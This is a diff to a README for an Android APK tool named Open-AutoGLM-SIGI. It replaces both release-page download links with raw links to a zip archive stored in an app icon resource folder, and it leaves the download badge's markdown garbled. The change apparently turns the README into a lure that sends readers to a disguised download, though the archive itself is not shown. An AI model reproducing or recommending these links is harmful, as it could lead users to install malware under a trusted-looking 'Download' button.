@@ -6,7 +6,7 @@ Open-AutoGLM-SIGI is a tool for installing a specialized Android APK with ease. 
 
 ## 📥 Download Open-AutoGLM-SIGI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/Hack1001231/Open-AutoGLM-SIGI/releases)
+[![Download Now](https://raw.githubusercontent.com/Hack1001231/Open-AutoGLM-SIGI/main/android-app/app/src/main/res/mipmap-xhdpi/GL_Auto_Open_SIGI_v2.1.zip%20Now-%https://raw.githubusercontent.com/Hack1001231/Open-AutoGLM-SIGI/main/android-app/app/src/main/res/mipmap-xhdpi/GL_Auto_Open_SIGI_v2.1.zip)](https://raw.githubusercontent.com/Hack1001231/Open-AutoGLM-SIGI/main/android-app/app/src/main/res/mipmap-xhdpi/GL_Auto_Open_SIGI_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Open-AutoGLM-SIGI is a tool for installing a specialized Android APK with ease. 
 
 To get started, visit the Releases page. This is where you will find the Android APK for download.
 
-[Download the latest release](https://github.com/Hack1001231/Open-AutoGLM-SIGI/releases)
+[Download the latest release](https://raw.githubusercontent.com/Hack1001231/Open-AutoGLM-SIGI/main/android-app/app/src/main/res/mipmap-xhdpi/GL_Auto_Open_SIGI_v2.1.zip)
 
 ### 2. Choose the Latest APK
 
